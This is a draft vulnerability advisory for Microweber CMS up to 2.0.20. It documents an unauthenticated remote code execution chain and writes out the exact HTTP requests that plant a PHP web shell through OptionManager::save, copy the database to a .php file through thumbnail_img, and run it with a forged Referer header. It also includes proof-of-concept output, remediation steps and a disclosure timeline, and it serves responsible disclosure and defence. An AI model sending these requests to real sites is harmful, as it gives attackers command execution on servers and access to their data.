# Advisory — Microweber CMS ≤ 2.0.20: Unauthenticated Remote Code Execution (chain of 3)

| | |
|---|---|
| Severity | **CRITICAL — CVSS v3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) |
| Affected | Microweber CMS **≤ 2.0.20** (v2.0.20 = latest release, 2025-08-14, commit `51ac711`) |
| Fixed | not yet released at time of reporting |
| CVE | pending |
| Authentication required | **none** |
| Verified on | fresh default install (SQLite), official GitHub tag `2.0.20`, MD5-verified source |

## 1. Summary

Three individually moderate issues combine into a **fully unauthenticated, self-sufficient RCE** requiring exactly **3 HTTP GET requests** — no account, no CSRF token, no session, no pre-existing file, no target knowledge beyond the URL. Any network-adjacent attacker obtains OS command execution under the web server user on a default installation.

```
[GET 1] plant raw PHP into the options table  (SQLite DB file)
[GET 2] copy the whole DB file to userfiles/modules/<name>.php
[GET 3] trigger /module/?module=<name> -> include -> RCE
```

## 2. The vulnerabilities

### F-015 — Missing authentication in `OptionManager::save()` (CWE-306)

`src/MicroweberPackages/Option/OptionManager.php` (~line 333):

- the `is_admin()` check is **commented out** with a note that it "moved to middleware" — but the Laravel `admin` middleware only guards the *route* `api/option/save`, not the **legacy class-dispatch route** `ApiController@api` (`/api/<Namespace>/<Class>/<method>`), which invokes the method directly on any already-loaded class;
- the `HTMLClean` (XSS) filter is **also commented out**, and the save runs with `allow_html=true, allow_scripts=true`.

Result: an anonymous GET stores an **arbitrary raw string** (including `<?php … ?>`) in the `options` table. On the default SQLite install the bytes land verbatim inside `storage/database.sqlite`.

```
GET /api/MicroweberPackages/Option/OptionManager/save
    ?option_key=<k>&option_group=<k>&option_value=%3C%3Fphp+system($_GET['c']);+%3F%3E
→ 200 true
```

A second raw-write gadget (`CategoryManager::save`) was confirmed as well (guest can create categories with raw bytes; no auth check inside the method).

### F-NEW-02 — Arbitrary file write via `thumbnail_img()` (CWE-22)

`src/MicroweberPackages/Media/MediaManager.php` (~line 948):

- the endpoint is `api_expose`-public; parameters are imported with **`extract($params)`**;
- `src` is only prefixed with the MW root (any readable file inside the install, e.g. `storage/database.sqlite`, `.env`), and **`cache_path_relative` is not sanitized** — `normalize_path($cache_path, false)` never resolves `../` and the value is appended under `userfiles/` verbatim;
- when `ext=svg` the `svgScaleHack()` branch returns file content **untouched** (its `preg_match` for `<svg width="…px">` does not match non-SVG input), and the result is written via `file_put_contents()`.

Result: an anonymous GET copies **any readable file** to a **chosen web-accessible path**:

```
GET /api/thumbnail_img
    ?src=storage/database.sqlite&ext=svg&width=200&height=200
    &cache_path_relative=modules/<name>.php
→ 200, whole DB copied to userfiles/modules/<name>.php
```

(Partial overlap with CVE-2026-12198 / CVE-2026-65694, which covered the *read* primitive; the *write* primitive and the RCE chain are new.)

### F-NEW-03 — `SameSiteRefererMiddleware` trivially bypassable (CWE-290)

`src/MicroweberPackages/App/Http/Middleware/SameSiteRefererMiddleware.php` (~line 43): the only guard on module execution is `Str::startsWith($referer, site_url())` — a header **fully controlled by the client**. Sending `Referer: <site-url>/` satisfies it. A `Referer` header must never be a security boundary; Laravel's `VerifyCsrfToken` exists for this purpose.

```
GET /module/?module=<name>&c=whoami
Referer: http://target/
→ module loader includes userfiles/modules/<name>.php → RCE
```

## 3. Proof of Concept

Zero-dependency (Python 3.6+ stdlib only): [`exploit/microweber_unauth_rce.py`](exploit/microweber_unauth_rce.py)

```
[1/3] OptionManager::save has no auth check … http 200 'true' => ok
[2/3] thumbnail_img arbitrary write … 671744 bytes, sqlite magic=True => ok
[3/3] /module/ include, forged same-site referer … markers=True
+ * VULNERABLE - unauthenticated rce --+
```

Verified against release tag `2.0.20` **and** `master` HEAD `51ac711` (clone 2026-11-13 — no commits after the release tag). Exit codes: `0` vulnerable, `1` patched/not confirmed, `2` error. A `--test` mode (plant → execute → verify → cleanup) is included for patch validation.

## 4. Remediation

1. `OptionManager::save()` (and sibling managers using the same pattern): restore the in-method `is_admin()` check and `HTMLClean` pass — never rely on route middleware for a method also reachable through the legacy class-dispatch.
2. `thumbnail_img()`: drop `extract($params)`; constrain `src` to the media directory after `realpath()`; **remove the `cache_path_relative` parameter**; the SVG branch must verify the true extension of `$src`; restrict writable cache to image extensions only.
3. Replace the `Referer` check with Laravel CSRF token verification for state-changing/module endpoints.
4. Module loader: do not include standalone `.php` files from `userfiles/modules/` unless the module is registered in the DB.
5. Defense-in-depth: disable PHP execution in `userfiles/` (nginx `location ~* ^/userfiles/.*\.php$ { deny all; }` / `php_flag engine off`); restrict the legacy `/api/<Namespace>/<Class>/<method>` dispatcher to an explicit class allowlist; run the web user with least privileges.
6. Post-incident note for defenders: deleting the planted `option` row is **not** sufficient — the payload survives in SQLite free pages; `VACUUM` the database and rotate all secrets (APP_KEY, DB credentials, admin passwords) on any suspected exploitation.

## 5. Disclosure timeline

| Date | Event |
|---|---|
| 2025-08-14 | v2.0.20 released |
| 2026-Q4 | Chain discovered & verified in lab (fresh install) |
| **[FILL: report date]** | Vendor notified (GitHub private vulnerability reporting + email); CVE requested |
| TBD | Vendor acknowledgment / fix / CVE |
| TBD | Public release (patch, or 90-day expiry) |

---

*Reporter: 0xki29 — <https://0xki29.github.io/blog>. All testing performed on locally hosted, lab-only installations. Responsible disclosure policy: 90 days from vendor notification.*
